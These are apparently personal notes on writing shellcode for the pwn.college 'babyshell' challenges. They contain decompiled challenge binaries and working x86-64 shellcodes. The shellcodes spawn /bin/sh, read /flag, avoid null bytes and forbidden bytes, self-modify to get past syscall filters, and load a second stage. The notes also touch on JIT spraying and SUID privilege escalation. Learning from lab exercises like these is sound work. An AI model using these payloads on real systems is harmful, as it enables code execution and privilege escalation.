# Shellcoding

tmux can behave very funny with shellcodes.

Compilation with `gcc -z execstack` allows execution on the stack. The issue arises when a function captures an address on the stack. Overriding this address should be able to get shellcode execution.

Adding data in the code:

```s
.string "hello"
.byte 0x48, 0x45, 0x4c, 0x4c, 0x4f


mov rbx, 0x0068732f6e69622f    <--- move "/bin/sh\0" into rbx
push rbx                       <--- push the thing onto the stack
mov rdi, rsp		       <--- first argument to the function
```
Compilation: `gcc -nostdlib -static shellcode.s -o shellcode-elf`
Extraction: `objcopy --dump-section .text=shellcode-raw shellcode-elf`
Inject the shellcode: `( cat shellcode-raw; cat ) | ./sample1`

**A note on 32-bit shellcoding when being executed on stack**:

- Loading `/bin//sh` into `ebx`. This shall make `ebx` point to a string, so it is of paramount importance to terminate the string with `\x00`; thus the `push eax` thing.

```s
xor    %eax,%eax
push   %eax
push   $0x68732f2f
push   $0x6e69622f
mov    %esp,%ebx
```

- After this:

	- `ebx` is pushed onto the stack again by the same null-pointer technique

	- `edx` is zeroed out (which is fine)

	- `ecx` points to the `esp` 

At `int 0x80`, the following is the status:

- EBX  0xffffd054 __ '/bin//sh' or the **path**

- ECX  0xffffd04c __ 0xffffd054 __ '/bin//sh' or the **argv**

- EDX  0x0 or the **envp**

## Debugging shellcodes

Simply use `strace` to trace the syscalls. Or use `gdb` for the same. Breakpoints can also be hardcoded into the shellcode through the `int3` instruction. In case of dynamic stuff, it is not always known where the shellcode ends up, so this is much easier in that case.

## Need to play around with opcodes?

Try [this](https://defuse.ca/online-x86-assembler.htm#disassembly). Shall be a faster tester than compiling on machine.

## Other architectures

Using cross-compiler toolchain and through emulators.

amd64: `gcc -nostdlib -static shellcode.s -o shellcode-elf`
mips: `mips-linux-gnu-gcc -nostdlib -static shellcode.s -o shellcode-elg`

Running:
amd64: `./shellcode`
mips: `qemu-mips-static ./shellcode`

qemu has more options: `-strace` and `-g 1234` (remote gdb debugging)

## Size of the write

```s
mov BYTE PTR [rax], 5
mov WORD PTR [rax], 5
mov DWORD PTR [rax], 5
mov QWORD PTR [rax], 5
```

## Challenges

- Injecting shellcode with `strcpy` can't contain null bytes. Basically, there may be certain bytes that are forbidden by the entry point you have to a certain program.

- Having a constant `10` into the shellcode is a problem as that is treated as newline. Instead move 9 and increment.

- The following condition may arise:

```s
mov rbx, 0x67616c662f   <------- this sets 3 null bytes

So do:
mov ebx, 0x67616c66
shl rbx, 8
mov bl, 0x2f
```

- Multistage shellcode

The following shellcode updates the rip to the point where the shellcode is actually read. You can insert some nop at the start for extra buffer. **Read for more information at level 9 below**

```s
Stage 1: read the stage 2 shellcode
	read(0, rip, 1000);  <----- read stuff from stdin

Stage 2: anything


.global _start
_start:
.intel_syntax noprefix
        lea rdi, [rip+0x1000]
        mov rax, 0
        mov rdi, 0
        mov rdx, 1000
        syscall
        jmp rdi
```

- Bypassing restrictions - understand that Von Neumann architecture makes no difference between code and data.

```s
inc BYTE PTR [rip]
.byte 0e
.byte 05
```

Although you have data `0e 05`, it will turn to `0f 05` and the processor will interpret it as `syscall`, exactly the thing the binary didn't want to do

Testing: `gcc -Wl, -N --static -nostdlib ...` to make .text portion writable (so `inc` actually works). Note that if you objdump stuff, the byte will be shown as bad, but if you execute the thing, it will run just fine. Goes on to show that a writable and executable page changes stuff during execution.

## Shellcode mangling

Shellcode might be sorted, compressed/uncompressed, and encrypted/decrypted. In such cases, careful stuff is needed to craft such a shellcode.

## Shellcode can't communicate?

- Shellcode output is not visible to the injector. All file descriptors have been closed. In that case, we need to find a way to communicate the flag. 

- Then information can come through stuff like: program hung or didn't hung, crashed or didn't crash

## Data execution prevention

- Permissions in today's system design to slightly segregate data and code: PROT_READ, PROT_WRITE, and PROT_EXEC

- Normally, all code is in the .text section of the ELF, so no need to execute stuff on the stack or heap. This is denoted by **NX** bit, or no-execute bit. Point is that the thing that can be written and executed must be different.

## egghunter shellcode notes (staged shellcode)

[Walkthrough SLAE assignment](https://anubissec.github.io/Egghunter-Shellcode/) and [memory profiling](http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf)

- Choose a 8 byte egg as the pointer where to search for the staged shellcode.

- Loop through pages in memory and find where that 8-byte egg is placed.

## Examples

- For instance, shellcode basically tries to gain access to a shell of the form `execve('/bin/bash', NULL, NULL)` for arbitrary command execution.

- What could be other injection points wherein the shellcode can be injected?

-- **De protecting memory**: memory can be made executable through `mprotect(PROT_EXEC)`. So trick the program into this and execute the shellcode. This is done through ROP chains.

-- **Just in time compilation**: JIT tries to compile stuff little at a time. This can be exploited through changing code and permissions. Run `grep -l rwx /proc*/maps | parallel "ls -l {//}/exe"` and get a list of pages mapped in memory that are writable and executable.

-- If the JIT is mprotect() safe, try **JIT spraying**. Basically, inject the shellcode into one of the constants, which JIT loads into memory and makes it executable. Then try to redirect execution to that point.

```s
mov rax 59                 <----- execve syscall number
lea rdi, [rip+binsh]	   <----- first argument to the string
mov rsi, 0		   <----- second argument to NULL
mov rdx, 0		   <----- third argument to NULL
syscall			   <----- executing the syscall
binsh:
	.string "/bin/sh"
```

- A `small` non-null shellcode

```s
.global _start
_start:
.intel_syntax noprefix
    mov rcx, 0xFF978CD091969DD0
    not rcx
    xor rsi, rsi
    push rcx
    mov rdi, rsp
    mov al, 0x3b
    syscall

```


Other kinds of stuff: `sendfile(1, open("/flag", NULL), 0, 1000);`

```s
mov rbx, 0x00000067616c662f		<---------- pushes "/flag"
push rbx
mov rax, 2				<---------- syscall number of open()
mov rdi, rsp				<---------- first argument to open()
mov rsi, 0				<---------- second argument to open(): NULL
syscall					<---------- syscall

mov rdi, 1				<---------- first argument of sendfile(): the file descriptor (stdout)
mov rsi, rax				<---------- second argument of sendfile(): file descriptor returned by open()
mov rdx, 0				<---------- third argument
mov r10, 1000				<---------- fourth argument
mov rax, 40				<---------- syscall for sendfile()

syscall

mov rax, 60				<--------- syscall for exit()
syscall
```

## pwn.college challenge pointers

### babyshell_level1_teaching1

Instead of observing the source directly, better to download the binary and analyse it in ghidra. For full simulation, set SUID bit.

```s
sudo chown root.root babyshell_level1_teaching1

sudo chmod u+s babyshell_level1_teaching1
```
```c
undefined8 main(int param_1,char **param_2,char **param_3)

{
  size_t sVar1;
  int local_1c;
  char **local_18;
  char **local_10;
  
  if (param_1 < 1) {
                    /* WARNING: Subroutine does not return */
    __assert_fail("argc > 0","<stdin>",100,(char *)&__PRETTY_FUNCTION__.10951);
  }
  puts("###");
  printf("### Welcome to %s!\n",*param_2);
  puts("###");
  putchar(10);
  puts("This challenge reads in some bytes, modifies them (depending on the specific");
  puts("challenge configuration, and executes them as code! This is a common exploitation");
  puts("scenario, called \"code injection\". Through this series of challenges, you will");
  puts("practice your shellcode writing skills under various constraints!");
  putchar(10);
  puts("To ensure that you are shellcoding, rather than doing other tricks, this");
  puts("will sanitize all environment variables and arguments and close all file");
  puts("descriptors > 2,");
  putchar(10);
  local_1c = 3;
  while (local_18 = param_2, local_1c < 10000) {
    close(local_1c);
    local_1c = local_1c + 1;
  }
  while (local_10 = param_3, *local_18 != (char *)0x0) {
    sVar1 = strlen(*local_18);
    memset(*local_18,0,sVar1);
    local_18 = local_18 + 1;
  }
  while (*local_10 != (char *)0x0) {
    sVar1 = strlen(*local_10);
    memset(*local_10,0,sVar1);
    local_10 = local_10 + 1;
  }
  shellcode_mem = (code *)mmap((void *)0x17011000,0x4000,7,0x22,0,0);
  printf("Mapping shellcode memory at %p.\n",shellcode_mem);
  if (shellcode_mem == (code *)0x17011000) {
    putchar(10);
    printf("Your shellcode will be read into memory at %p and executed. In this challenge,\n",
           shellcode_mem);
    puts("this address is constant across executions, so your shellcode can hard-code");
    puts("some addresses. Later challenges might not be so forgiving...");
    putchar(10);
    printf("Reading %#x bytes from stdin into %p.\n",0x4000,shellcode_mem);
    shellcode_size = read(0,shellcode_mem,0x4000);
    if (shellcode_size != 0) {
      putchar(10);
      puts("This challenge is about to execute the following shellcode:");
      putchar(10);
      print_disassembly(shellcode_mem,shellcode_size,shellcode_size);
      putchar(10);
      puts("Executing shellcode!\n");
      (*shellcode_mem)();
      return 0;
    }
                    /* WARNING: Subroutine does not return */
    __assert_fail("shellcode_size > 0","<stdin>",0x88,(char *)&__PRETTY_FUNCTION__.10951);
  }
                    /* WARNING: Subroutine does not return */
  __assert_fail("shellcode_mem == (void *) 0x17011000","<stdin>",0x7d,
                (char *)&__PRETTY_FUNCTION__.10951);
}

```
From this, it is clear that the code closes all file descriptors and clears the memory, inputs a shellcode at a specific location, and executes it at `(*shellcode)()`. So this is straightforward shellcode injection and execution. However, spawning a shell will not escalte the ID of the user. This is because `/bin/sh` is interally configured to drop privileges when run within a SUID binary. Thereby, write custom code in a C file, compile it into a binary, and point that in the shellcode instead.

### babyshell_level1_testing1 (Code injection)

This challenge is similar to the previous one.

```c

undefined8 main(int param_1,char **param_2,char **param_3)

{
  size_t sVar1;
  int local_1c;
  char **local_18;
  char **local_10;
  
  if (param_1 < 1) {
                    /* WARNING: Subroutine does not return */
    __assert_fail("argc > 0","<stdin>",0xe,(char *)&__PRETTY_FUNCTION__.3706);
  }
  puts("###");
  printf("### Welcome to %s!\n",*param_2);
  puts("###");
  putchar(10);
  puts("This challenge reads in some bytes, modifies them (depending on the specific");
  puts("challenge configuration, and executes them as code! This is a common exploitation");
  puts("scenario, called \"code injection\". Through this series of challenges, you will");
  puts("practice your shellcode writing skills under various constraints!");
  putchar(10);
  local_1c = 3;
  while (local_18 = param_2, local_1c < 10000) {
    close(local_1c);
    local_1c = local_1c + 1;
  }
  while (local_10 = param_3, *local_18 != (char *)0x0) {
    sVar1 = strlen(*local_18);
    memset(*local_18,0,sVar1);
    local_18 = local_18 + 1;
  }
  while (*local_10 != (char *)0x0) {
    sVar1 = strlen(*local_10);
    memset(*local_10,0,sVar1);
    local_10 = local_10 + 1;
  }
  shellcode_mem = (code *)mmap((void *)0x17011000,0x4000,7,0x22,0,0);
  printf("Mapping shellcode memory at %p.\n",shellcode_mem);
  if (shellcode_mem == (code *)0x17011000) {
    printf("Reading %#x bytes from stdin into %p.\n",0x4000,0x17011000);
    shellcode_size = read(0,shellcode_mem,0x4000);
    if (shellcode_size != 0) {
      puts("Executing shellcode!\n");
      (*shellcode_mem)();
      return 0;
    }
                    /* WARNING: Subroutine does not return */
    __assert_fail("shellcode_size > 0","<stdin>",0x27,(char *)&__PRETTY_FUNCTION__.3706);
  }
                    /* WARNING: Subroutine does not return */
  __assert_fail("shellcode_mem == (void *) 0x17011000","<stdin>",0x22,
                (char *)&__PRETTY_FUNCTION__.3706);
}
```

Similar attack path as the previous one.

### babyshell_level2_teaching1

This time, there is no `mmap`, thereby there is no information where the shellcode shall be placed in memory. Hence, things should be relative in building the shellcode. Ghidra does one stuff though: the shellcode is restricted to 16 byte buffer. The size is much larger if seen on the actual challenge source code. The same process works as before thereby, since that shellcode was also relatively placed in memory rather than hardcoded.

```c

undefined8 main(int param_1,char **param_2,char **param_3)

{
  undefined *puVar1;
  size_t sVar2;
  undefined *puVar3;
  long in_FS_OFFSET;
  int local_402c;
  char **local_4028;
  char **local_4020;
  undefined shellcode [16];
  undefined local_4008 [16376];
  long local_10;
  char *binary_name;
  
  puVar1 = &stack0xfffffffffffffff8;
  do {
    puVar3 = puVar1;
    *(undefined8 *)(puVar3 + -0x1000) = *(undefined8 *)(puVar3 + -0x1000);
    puVar1 = puVar3 + -0x1000;
  } while (puVar3 + -0x1000 != local_4008);
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  if (param_1 < 1) {
                    /* WARNING: Subroutine does not return */
    *(undefined8 *)(puVar3 + -0x1058) = 0x1017da;
    __assert_fail("argc > 0","<stdin>",100,(char *)&__PRETTY_FUNCTION__.10951,puVar3[-0x1058]);
  }
  *(undefined8 *)(puVar3 + -0x1058) = 0x1017e6;
  puts("###",puVar3[-0x1058]);
  binary_name = *param_2;
  *(undefined8 *)(puVar3 + -0x1058) = 0x101804;
  printf("### Welcome to %s!\n",binary_name);
  *(undefined8 *)(puVar3 + -0x1058) = 0x101810;
  puts("###",puVar3[-0x1058]);
  *(undefined8 *)(puVar3 + -0x1058) = 0x10181a;
  putchar(10,puVar3[-0x1058]);
  *(undefined8 *)(puVar3 + -0x1058) = 0x101826;
  puts("This challenge reads in some bytes, modifies them (depending on the specific",
       puVar3[-0x1058]);
  *(undefined8 *)(puVar3 + -0x1058) = 0x101832;
  puts("challenge configuration, and executes them as code! This is a common exploitation",
       puVar3[-0x1058]);
  *(undefined8 *)(puVar3 + -0x1058) = 0x10183e;
  puts("scenario, called \"code injection\". Through this series of challenges, you will",
       puVar3[-0x1058]);
  *(undefined8 *)(puVar3 + -0x1058) = 0x10184a;
  puts("practice your shellcode writing skills under various constraints!",puVar3[-0x1058]);
  *(undefined8 *)(puVar3 + -0x1058) = 0x101854;
  putchar(10,puVar3[-0x1058]);
  *(undefined8 *)(puVar3 + -0x1058) = 0x101860;
  puts("To ensure that you are shellcoding, rather than doing other tricks, this",puVar3[-0x1058]);
  *(undefined8 *)(puVar3 + -0x1058) = 0x10186c;
  puts("will sanitize all environment variables and arguments and close all file",puVar3[-0x1058]);
  *(undefined8 *)(puVar3 + -0x1058) = 0x101878;
  puts("descriptors > 2,",puVar3[-0x1058]);
  *(undefined8 *)(puVar3 + -0x1058) = 0x101882;
  putchar(10,puVar3[-0x1058]);
  local_402c = 3;
  while (local_4028 = param_2, local_402c < 10000) {
    *(undefined8 *)(puVar3 + -0x1058) = 0x10189b;
    close(local_402c,puVar3[-0x1058]);
    local_402c = local_402c + 1;
  }
  while (local_4020 = param_3, *local_4028 != (char *)0x0) {
    binary_name = *local_4028;
    *(undefined8 *)(puVar3 + -0x1058) = 0x1018d0;
    sVar2 = strlen(binary_name,puVar3[-0x1058]);
    binary_name = *local_4028;
    *(undefined8 *)(puVar3 + -0x1058) = 0x1018ea;
    memset(binary_name,0,sVar2,puVar3[-0x1058]);
    local_4028 = local_4028 + 1;
  }
  while (*local_4020 != (char *)0x0) {
    binary_name = *local_4020;
    *(undefined8 *)(puVar3 + -0x1058) = 0x101923;
    sVar2 = strlen(binary_name,puVar3[-0x1058]);
    binary_name = *local_4020;
    *(undefined8 *)(puVar3 + -0x1058) = 0x10193d;
    memset(binary_name,0,sVar2,puVar3[-0x1058]);
    local_4020 = local_4020 + 1;
  }
  shellcode_mem = (code *)shellcode;
  *(undefined8 *)(puVar3 + -0x1058) = 0x10197d;
  printf("Placing shellcode on the stack at %p.\n",shellcode_mem);
  sz = ((ulong)(&stack0xfffffffffffffff8 + -(long)(puVar3 + -0x1050)) >> 3) + 2;
  *(undefined8 *)(puVar3 + -0x1058) = 0x1019d0;
  sp = puVar3 + -0x1050;
  rp = (undefined *)register0x00000020;
  bp = &stack0xfffffffffffffff8;
  putchar(10,puVar3[-0x1058]);
  *(undefined8 *)(puVar3 + -0x1058) = 0x1019dc;
  puts("In this challenge, shellcode will be copied onto the stack and executed. Since",
       puVar3[-0x1058]);
  *(undefined8 *)(puVar3 + -0x1058) = 0x1019e8;
  puts("the stack location is randomized on every execution, your shellcode will need to",
       puVar3[-0x1058]);
  *(undefined8 *)(puVar3 + -0x1058) = 0x1019f4;
  puts("be *position-independent*.",puVar3[-0x1058]);
  *(undefined8 *)(puVar3 + -0x1058) = 0x1019fe;
  putchar(10,puVar3[-0x1058]);
  *(undefined8 *)(puVar3 + -0x1058) = 0x101a1e;
  printf("Reading %#x bytes from stdin into %p.\n",0x4000,shellcode_mem);
  *(undefined8 *)(puVar3 + -0x1058) = 0x101a37;
  shellcode_size = read(0,shellcode_mem,0x4000,puVar3[-0x1058]);
  if (shellcode_size != 0) {
    *(undefined8 *)(puVar3 + -0x1058) = 0x101a73;
    putchar(10,puVar3[-0x1058]);
    *(undefined8 *)(puVar3 + -0x1058) = 0x101a7f;
    puts("This challenge is about to execute the following shellcode:",puVar3[-0x1058]);
    *(undefined8 *)(puVar3 + -0x1058) = 0x101a89;
    putchar(10,puVar3[-0x1058]);
    *(undefined8 *)(puVar3 + -0x1058) = 0x101aa2;
    print_disassembly(shellcode_mem,shellcode_size,shellcode_size);
    *(undefined8 *)(puVar3 + -0x1058) = 0x101aac;
    putchar(10,puVar3[-0x1058]);
    *(undefined8 *)(puVar3 + -0x1058) = 0x101ab8;
    puts("Executing shellcode!\n",puVar3[-0x1058]);
    *(undefined8 *)(puVar3 + -0x1058) = 0x101ac9;
    (*shellcode_mem)();
    if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
      return 0;
    }
                    /* WARNING: Subroutine does not return */
    *(undefined8 *)(puVar3 + -0x1058) = 0x101ae2;
    __stack_chk_fail();
  }
                    /* WARNING: Subroutine does not return */
  *(undefined8 *)(puVar3 + -0x1058) = 0x101a69;
  __assert_fail("shellcode_size > 0","<stdin>",0x88,(char *)&__PRETTY_FUNCTION__.10951,
                puVar3[-0x1058]);
}

```
### babyshell_level2_testing1

- Works with relative shellcode

### babyshell_level3_teaching1

This challenge requires the shellcode must not have any `0x48` byte.

```c
undefined8 main(int param_1,char **param_2,char **param_3)

{
  size_t sVar1;
  uint local_24;
  char **local_20;
  char **local_18;
  int local_c;
  
  if (param_1 < 1) {
                    /* WARNING: Subroutine does not return */
    __assert_fail("argc > 0","<stdin>",100,(char *)&__PRETTY_FUNCTION__.10951);
  }
  puts("###");
  printf("### Welcome to %s!\n",*param_2);
  puts("###");
  putchar(10);
  puts("This challenge reads in some bytes, modifies them (depending on the specific");
  puts("challenge configuration, and executes them as code! This is a common exploitation");
  puts("scenario, called \"code injection\". Through this series of challenges, you will");
  puts("practice your shellcode writing skills under various constraints!");
  putchar(10);
  puts("To ensure that you are shellcoding, rather than doing other tricks, this");
  puts("will sanitize all environment variables and arguments and close all file");
  puts("descriptors > 2,");
  putchar(10);
  local_c = 3;
  while (local_18 = param_2, local_c < 10000) {
    close(local_c);
    local_c = local_c + 1;
  }
  while (local_20 = param_3, *local_18 != (char *)0x0) {
    sVar1 = strlen(*local_18);
    memset(*local_18,0,sVar1);
    local_18 = local_18 + 1;
  }
  while (*local_20 != (char *)0x0) {
    sVar1 = strlen(*local_20);
    memset(*local_20,0,sVar1);
    local_20 = local_20 + 1;
  }
  shellcode_mem = (code *)mmap((void *)0x1337000,0x1000,7,0x22,0,0);
  printf("Mapping shellcode memory at %p.\n",shellcode_mem);
  if (shellcode_mem == (code *)0x1337000) {
    putchar(10);
    printf("Your shellcode will be read into memory at %p and executed. In this challenge,\n",
           shellcode_mem);
    puts("this address is constant across executions, so your shellcode can hard-code");
    puts("some addresses. Later challenges might not be so forgiving...");
    putchar(10);
    printf("Reading %#x bytes from stdin into %p.\n",0x1000,shellcode_mem);
    shellcode_size = read(0,shellcode_mem,0x1000);
    if (shellcode_size == 0) {
                    /* WARNING: Subroutine does not return */
      __assert_fail("shellcode_size > 0","<stdin>",0x88,(char *)&__PRETTY_FUNCTION__.10951);
    }
    putchar(10);
    puts("Executing filter...");
    puts("This challenge requires that your shellcode have no H bytes!");
    local_24 = 0;
    while( true ) {
      if (shellcode_size <= (ulong)(long)(int)local_24) {
        putchar(10);
        puts("This challenge is about to execute the following shellcode:");
        putchar(10);
        print_disassembly(shellcode_mem,shellcode_size,shellcode_size);
        putchar(10);
        puts("Executing shellcode!\n");
        (*shellcode_mem)();
        return 0;
      }
      if (shellcode_mem[(int)local_24] == (code)0x48) break;
      local_24 = local_24 + 1;
    }
    printf("Failed filter at byte %d!\n",(ulong)local_24);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
                    /* WARNING: Subroutine does not return */
  __assert_fail("shellcode_mem == (void *) 0x1337000","<stdin>",0x7d,
                (char *)&__PRETTY_FUNCTION__.10951);
}
```

Byte 48 comes from the fact that we are assembling in x86_64 and using 64 bit registers. Converting stuff to 32 bit makes things easier. Final shellcode:


```s
.global _start
_start:
.intel_syntax noprefix
mov eax, 59
lea edi, [rip+binsh]
xor esi, esi
xor edx, edx
syscall
binsh:
	.string "/bin/sh"
```
### babyshell_level3_testing1

Done with similar shellcode as before

### babyshell_level4_teaching1

Disassembling the stuff shows that there must be no null bytes this time. Null bytes can come up through 32 bit instructions for 64 bit architecture.

```s
.global _start
_start:
.intel_syntax noprefix

	mov rcx, 0x11656e2f706d742f   <---- /tmp/ne
	shl rcx, 0x08
	shr rcx, 0x08
	push rcx
	lea rdi, [rsp]
	xor rdx, rdx
	xor rsi, rsi
	mov al, 0x3b
	syscall
```
It's important to keep a null terminator to the string in the first argument of execve, which is precisely what the first three statements do.

### babyshell_level4_testing1

Similar shellcode as above

### babyshell_level5_teaching1

This time no syscall, sysenter, or int instructions in the shellcode. Bypassing a restriction on syscall

```s
inc BYTE PTR [rip]
.byte 0x0e
.byte 0x05
```
### babyshell_level5_testing1

Like the previous one

### babyshell_level6_teaching1

This challenge is about to remove write permissions from the first 4096 bytes of your shellcode. If you were counting on modifying those parts of your shellcode, you will have to develop a new strategy. A `nop sled` does the trick. Create the same shellcode as before and attack 4096 nops after `.intel_syntax noprefix` and before the main thing.

### babyshell_level6_testing1

Similar to previous one

### babyshell_level7_teaching1

Randomly skips anywhere up to 2048 bytes from the start of the shellcode. Again a `nop-sled` can work here.

### babyshell_level7_testing1

Again a nop sled works fine

### babyshell_level8_teaching1

Sorts the shellcode. However the following shellcode worked just as fine:

```s
.global _start
_start:
.intel_syntax noprefix
mov al, 59
mov rbx, 0x0068732f6e69622f
push rbx
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
inc BYTE PTR [rip]
.byte 0x0e
.byte 0x05
```
### babyshell_level8_testing1

Same as above

### babyshell_level9_teaching1

Sorts the shellcode and closes `stdin`. Although the above shellcode is working, it's better to go with the hint, i.e. unpacking the shellcode in memory.

Although level 8 shellcode is working, I am trying to build a simple multi-stage shellcode:

- `open()` a file to get the file descriptor in `rax`

- `read()` to read the contents

- `jmp` to the portion wherein you can execute the bytes loaded

Below is a variant of the shellcode I used.

```s
.global _start
_start:
.intel_syntax noprefix

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; this is basically getting the file descriptor of the file wherein the shellcode bytes are stored
mov rax, 2
lea rdi, [rip+file]
mov rsi, 0
syscall
breakpoint: nop


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; read the bytes in and write in the space allocated below 
mov rdi, rax
mov rax, 0
lea rsi, [rip+insert_code_here] 
mov rdx, 1000
syscall

breakpoint2: nop

insert_code_here:
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop

file: .string "./tmp/shellcode-raw"
```
